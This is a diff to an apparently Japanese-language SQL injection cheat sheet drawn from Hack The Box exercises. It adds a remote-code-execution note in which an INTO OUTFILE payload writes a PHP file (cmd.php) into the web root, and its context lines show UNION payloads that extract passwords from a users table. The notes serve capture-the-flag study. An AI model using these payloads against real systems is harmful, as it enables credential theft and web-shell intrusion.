@@ -139,6 +139,13 @@
     * sha1が20バイトのため、16進数表記で40文字
   * パスワード推定の場合、`$c`は16進数で使用する文字および$に限定可能である
     * `[a-f0-9$]`
+* RCE
+  * outfileで、/var/www/html以下にphpファイルを生成する
+  * outfileはwhere節の後に存在してもよい
+  * Htb: Validation
+    ```sql
+    SELECT username FROM registration WHERE country = 'japan' into outfile '/var/www/html/cmd.php'
+    ```
 
 ## Examples
 * Htb: EarlyAccess
@@ -150,8 +157,6 @@
   ') UNION SELECT  0,1,password  FROM users;--
   ') UNION SELECT  0,1,2  INTO OUTFILE '/tmp/test.txt';--
   ```
-
-  
 
 ## SQLI Reference
 ----
